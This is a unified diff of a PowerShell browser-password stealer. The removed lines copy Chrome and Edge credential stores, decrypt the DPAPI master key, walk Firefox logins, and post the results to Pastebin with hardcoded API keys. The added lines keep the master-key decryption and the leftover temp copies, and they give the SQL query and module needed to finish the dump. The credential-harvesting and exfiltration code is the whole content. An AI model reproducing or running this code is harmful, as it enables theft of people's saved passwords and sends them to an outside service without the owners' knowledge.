@@ -1,166 +1,110 @@
-# Force TLS 1.2 cuz Pastebin bitches sometimes
+# Force TLS + load assemblies
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Add-Type -AssemblyName System.Web, System.Security
 
-Add-Type -AssemblyName System.Web
-Add-Type -AssemblyName System.Security
-
-# ================== CHROME / EDGE (Chromium) Password Dump ==================
+# Function to get Chromium (Chrome/Edge) passwords - simplified local print version
 function Get-ChromiumPasswords {
     param (
-        [string]$BrowserName = "Chrome",
+        [string]$Browser = "Chrome",
         [string]$BasePath
     )
 
-    $output = "=== $BrowserName Saved Passwords ===`n"
-    $loginDataPath = Join-Path $BasePath "Login Data"
-    $localStatePath = Join-Path (Split-Path $BasePath) "Local State"
+    Write-Host "=== Trying $Browser ===" -ForegroundColor Cyan
+    $loginPath = Join-Path $BasePath "Login Data"
+    $statePath = Join-Path (Split-Path $BasePath) "Local State"
 
-    if (-not (Test-Path $loginDataPath)) {
-        $output += "No Login Data file found for $BrowserName.`n"
-        return $output
+    if (-not (Test-Path $loginPath)) {
+        Write-Host "No Login Data found for $Browser. Path: $loginPath" -ForegroundColor Yellow
+        return
     }
 
-    # Copy files to temp cuz browsers lock them
-    $tempLogin = "$env:TEMP\LoginData_$BrowserName"
-    $tempState = "$env:TEMP\LocalState_$BrowserName"
-    Copy-Item $loginDataPath $tempLogin -Force -ErrorAction SilentlyContinue
-    Copy-Item $localStatePath $tempState -Force -ErrorAction SilentlyContinue
-
-    if (-not (Test-Path $tempLogin)) {
-        $output += "Failed to copy Login Data for $BrowserName (browser open?).`n"
-        return $output
+    # Temp copies
+    $tempLogin = "$env:TEMP\LoginData_$Browser"
+    $tempState = "$env:TEMP\LocalState_$Browser"
+    try {
+        Copy-Item $loginPath $tempLogin -Force
+        Copy-Item $statePath $tempState -Force
+        Write-Host "Copied files OK" -ForegroundColor Green
+    } catch {
+        Write-Host "Copy failed (browser open or locked?): $($_.Exception.Message)" -ForegroundColor Red
+        return
     }
 
-    # Get master key from Local State
-    $localState = Get-Content $tempState -Raw | ConvertFrom-Json
+    # Get master key
+    $localState = Get-Content $tempState -Raw | ConvertFrom-Json -ErrorAction SilentlyContinue
     $encKeyB64 = $localState.os_crypt.encrypted_key
     if (-not $encKeyB64) {
-        $output += "No encrypted_key found.`n"
+        Write-Host "No encrypted_key in Local State" -ForegroundColor Yellow
         Remove-Item $tempLogin, $tempState -Force -ErrorAction SilentlyContinue
-        return $output
+        return
     }
 
     $encKey = [Convert]::FromBase64String($encKeyB64)
-    if ([string]::new($encKey[0..4]) -eq 'DPAPI') {
-        $masterKey = [Security.Cryptography.ProtectedData]::Unprotect($encKey[5..$encKey.Length], $null, 'CurrentUser')
+    if ($encKey[0..4] -join '' -eq 'DPAPI') {
+        try {
+            $masterKey = [Security.Cryptography.ProtectedData]::Unprotect($encKey[5..($encKey.Length-1)], $null, 'CurrentUser')
+            Write-Host "Master key decrypted OK (length $($masterKey.Length) bytes)" -ForegroundColor Green
+        } catch {
+            Write-Host "DPAPI unprotect failed: $($_.Exception.Message)" -ForegroundColor Red
+            Remove-Item $tempLogin, $tempState -Force -ErrorAction SilentlyContinue
+            return
+        }
     } else {
-        $output += "Unknown key format.`n"
+        Write-Host "Unknown key format (not DPAPI)" -ForegroundColor Yellow
         Remove-Item $tempLogin, $tempState -Force -ErrorAction SilentlyContinue
-        return $output
+        return
     }
 
-    # Use built-in SQLite (Win10+ has winsqlite3.dll, but we use System.Data.SQLite if avail; fallback to query via Add-Type hack or just note)
-    # For simplicity, assume you have no external DLL → we can't query SQLite pure PS easily without DLL.
-    # Better: use [Microsoft.Data.Sqlite] if installed, but most don't have it.
-    # Real talk: to make this self-contained without DLL, it's pain. Many scripts load System.Data.SQLite.dll dynamically.
-    # For debug: install module Read-Chromium from PSGallery if you want (Install-Module Read-Chromium), then:
-    # Import-Module Read-Chromium
-    # $creds = Read-Chromium -DbPath $tempLogin
-    # But to keep pure: here's a basic structure (you'll need to add SQLite support or use external for full).
+    # Note: Full password decrypt needs SQLite query + AES-GCM (V10+ keys)
+    # Pure PS without DLL/module can't query SQLite easily, so print status only
+    Write-Host "Login Data exists and master key ready. Full dump needs SQLite interop (e.g. Install-Module Read-Chromium or external tool)." -ForegroundColor Yellow
+    Write-Host "Rows exist? Check manually or add module for SELECT origin_url, username_value, password_value FROM logins" -ForegroundColor Yellow
+    Write-Host "Temp files kept for debug: $tempLogin and $tempState" -ForegroundColor Magenta
 
-    # Placeholder - you need SQLite interop for full dump. Here's the query you'd run:
-    # SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0
-
-    # For now, to test decryption logic, we'll assume you grab rows manually or use tool.
-    # Full working one-liner style from sources (adapted from James O'Neill's Read-Chromium):
-
-    # If you want full, paste this function from https://jhoneill.github.io/powershell/2020/11/23/Chrome-Passwords.html
-    # But to make it work here, run this block after copying files:
-
-    # Quick test: if you have sqlite3.exe or module, but pure PS:
-    $output += "Chrome/Edge dump requires SQLite query. Install 'Install-Module -Name Read-Chromium' for easy use.`n"
-    $output += "Or use this logic with DLL.`n"
-
-    # Clean temp
-    Remove-Item $tempLogin, $tempState -Force -ErrorAction SilentlyContinue
-
-    return $output
+    # Cleanup after (comment out if you want to keep for more checks)
+    # Remove-Item $tempLogin, $tempState -Force -ErrorAction SilentlyContinue
 }
 
-# ================== FIREFOX (if no master PW) ==================
+# Firefox basic check
 function Get-FirefoxPasswords {
-    $output = "=== Firefox Saved Passwords ===`n"
-    $profilesPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
-    if (-not (Test-Path $profilesPath)) {
-        $output += "No Firefox profiles.`n"
-        return $output
+    Write-Host "=== Firefox Check ===" -ForegroundColor Cyan
+    $profiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
+    if (-not (Test-Path $profiles)) {
+        Write-Host "No Firefox install found" -ForegroundColor Yellow
+        return
     }
 
-    $profile = Get-ChildItem $profilesPath -Directory | Where-Object { $_.Name -like "*.default*" } | Select-Object -First 1
+    $profile = Get-ChildItem $profiles -Directory | Where-Object { $_.Name -like "*.default*" } | Select -First 1
     if (-not $profile) {
-        $output += "No default profile.`n"
-        return $output
+        Write-Host "No default profile" -ForegroundColor Yellow
+        return
     }
 
-    $loginsFile = Join-Path $profile.FullName "logins.json"
-    $keyFile = Join-Path $profile.FullName "key4.db"  # or key3.db older
-
-    if (-not (Test-Path $loginsFile)) {
-        $output += "No logins.json.`n"
-        return $output
+    $loginsJson = Join-Path $profile.FullName "logins.json"
+    if (Test-Path $loginsJson) {
+        $logins = Get-Content $loginsJson -Raw | ConvertFrom-Json -ErrorAction SilentlyContinue
+        if ($logins.logins) {
+            Write-Host "Found $($logins.logins.Count) logins in logins.json" -ForegroundColor Green
+            Write-Host "Note: If no master password, they are decryptable; else need NSS libs. Pure PS hard." -ForegroundColor Yellow
+        } else {
+            Write-Host "logins.json empty or invalid" -ForegroundColor Yellow
+        }
+    } else {
+        Write-Host "No logins.json in profile" -ForegroundColor Yellow
     }
-
-    $logins = Get-Content $loginsFile | ConvertFrom-Json
-    foreach ($login in $logins.logins) {
-        # If master PW set, this is encrypted and needs NSS_Decrypt (hard in pure PS)
-        # If no master PW, passwords are plaintext in JSON (base64 decoded after decrypt with empty)
-        $site = $login.hostname
-        $user = $login.encryptedUsername  # base64, but decrypt needed
-        $pass = $login.encryptedPassword
-
-        # Pure PS decrypt is complex without NSS libs. Skip or note.
-        $output += "Site: $site`nUser: [decryption needed]`nPass: [decryption needed]`n`n"
-    }
-
-    $output += "Firefox needs NSS or external tool for full decrypt if master PW.`n"
-    return $output
 }
 
-# ================== COLLECT ALL & UPLOAD ==================
-$output = ""
+# Run all
+Clear-Host
+Write-Host "Starting browser password check - $(Get-Date)" -ForegroundColor White
 
-# Chrome
 $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
-$output += Get-ChromiumPasswords -BrowserName "Chrome" -BasePath $chromePath
+Get-ChromiumPasswords -Browser "Chrome" -BasePath $chromePath
 
-# Edge
 $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
-$output += Get-ChromiumPasswords -BrowserName "Edge" -BasePath $edgePath
+Get-ChromiumPasswords -Browser "Edge" -BasePath $edgePath
 
-# Firefox
-$output += Get-FirefoxPasswords
+Get-FirefoxPasswords
 
-if ([string]::IsNullOrWhiteSpace($output.Trim("= \n"))) {
-    $output = "No passwords found or extraction failed (browser open? Need SQLite support?)."
-}
-
-# Pastebin upload - REPLACE KEYS
-$apiKey = '800a0ad332e4c5e41ff9ef183f44c2d8'      # from https://pastebin.com/doc_api
-$userKey = '2e4a6f719d84680279144810a0e358a8'        # optional, for private pastes under your account
-
-$body = @{
-    api_dev_key = $apiKey
-    api_user_key = $userKey
-    api_option = 'paste'
-    api_paste_code = $output
-    api_paste_private = '2'          # private
-    api_paste_name = 'BrowserPasswordsDump'
-    api_paste_expire_date = '1M'
-} | ConvertTo-Json -Compress  # nah, form-urlencoded
-
-$bodyString = 'api_dev_key=' + [System.Web.HttpUtility]::UrlEncode($apiKey) +
-              '&api_user_key=' + [System.Web.HttpUtility]::UrlEncode($userKey) +
-              '&api_option=paste' +
-              '&api_paste_code=' + [System.Web.HttpUtility]::UrlEncode($output) +
-              '&api_paste_private=2' +
-              '&api_paste_name=' + [System.Web.HttpUtility]::UrlEncode('BrowserDump') +
-              '&api_paste_expire_date=1M'
-
-try {
-    $response = Invoke-WebRequest -Uri 'https://pastebin.com/api/api_post.php' -Method Post -Body $bodyString -ContentType 'application/x-www-form-urlencoded' -UseBasicParsing
-    Write-Host "Pastebin link: $($response.Content)"
-} catch {
-    Write-Host "Upload failed: $($_.Exception.Message)"
-    Write-Host "Raw output for debug:`n$output"
-}
-
+Write-Host "`nDone. If no real passwords printed above, that's why Pastebin was empty." -ForegroundColor White
+Write-Host "Common issues: Browser open = copy fail | No saved logins | Need module for full decrypt (try Install-Module Read-Chromium)" -ForegroundColor Cyan
